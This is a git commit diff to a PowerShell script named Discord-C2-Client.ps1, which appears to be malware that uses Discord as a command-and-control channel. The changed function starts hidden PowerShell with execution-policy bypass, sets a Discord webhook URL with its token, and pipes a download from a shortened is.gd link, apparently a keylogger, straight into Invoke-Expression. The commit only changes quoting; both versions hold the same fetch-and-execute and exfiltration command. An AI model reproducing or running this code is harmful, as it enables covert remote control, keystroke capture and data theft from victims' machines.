6c6a1abd7b0b4cd9892c88d3d6025096f2509142
L∞re27 <85876585+Lore-Bul@users.noreply.github.com>
2026-07-07 23:54:53 +0200

    Update Discord-C2-Client.ps1

--- Discord-C2-Client.ps1
+++ Discord-C2-Client.ps1
@@ -985,7 +985,7 @@ Function ScreenParty {
 }
 
 Function Powershell {
-    Start-Process PowerShell.exe -ArgumentList ("-NoP -Ep Bypass -W H -C $dc='https://discord.com/api/webhooks/1512211575862329435/__PTyT_5jA8brTXqw-M7V06U9a0Mbuqt3dLXGXpu9lXM78lKxPl5Vwf2_TKX5LtG6NYM'; irm is.gd/bw0_kl_to_dc | iex")
+    Start-Process PowerShell.exe -ArgumentList ($dc='https://discord.com/api/webhooks/1512211575862329435/__PTyT_5jA8brTXqw-M7V06U9a0Mbuqt3dLXGXpu9lXM78lKxPl5Vwf2_TKX5LtG6NYM'; irm is.gd/bw0_kl_to_dc | iex)
     sendMsg -Message ":white_check_mark: ``classic powershell on other channel!`` :white_check_mark:"  
 }
 
